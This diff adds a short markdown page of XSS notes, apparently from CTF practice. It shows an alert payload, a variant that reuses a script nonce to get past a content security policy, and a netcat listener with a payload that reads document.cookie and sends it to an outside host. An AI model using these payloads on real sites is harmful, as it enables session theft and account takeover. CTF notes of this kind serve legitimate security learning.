@@ -1,0 +1,30 @@
+# XSS
+XSS is cross-sit scripting. This page just lists some tips and snippets of code:
+- [Check for script attributes](#check-for-script-attributes)
+- [Intercept a cookie](#intercept-a-cookie)
+
+## Check for script attributes
+When testing whether a site is vulnerable to XSS, you may try something like:
+```
+https://some.vuln.site?name=<script>alert(1)</script>
+```
+You can see your script code in the page, but no alert appeared. Check whether other scripts on the page have an attribute that may be needed to execute scripts. For example:
+```
+http://some.vuln.site/?name=<script%20nonce=LRGWAXOY98Es0zz0QOVmag==>alert(1)</script>
+```
+## Intercept a cookie
+In one CTF, there was an Admin server that could send a cookie to another server, and we needed to intercept that cookie.
+
+To intercept it, we set up a *netcat* listener, so we could send the cookie to it:
+```
+$ nc -nlvk 8080
+Listening on 0.0.0.0 8080
+```
+Now we went to the admin server for the challenge, and gave it a URL that would visit the target site, get the cookie and send it to us in a GET variable:
+```
+https://some.vuln.site/?name=<script%20nonce%3DLRGWAXOY98Es0zz0QOVmag%3D%3D>var%20a%3Ddocument.cookie%3B%20document.location%3D%60http:%2F%2Fcr4ck3rs.com:8080%2F%3Fc%3D%24%7Ba%7D%60<%2Fscript>
+```
+Without the URL encoding, this is:
+```
+https://some/vuln.site/?name=<script nonce="LRGWAXOY98Es0zz0QOVmag==">var a=document.cookie; document.location=`http://cr4ckers.com:8080/?c=${a}`</script>
+```
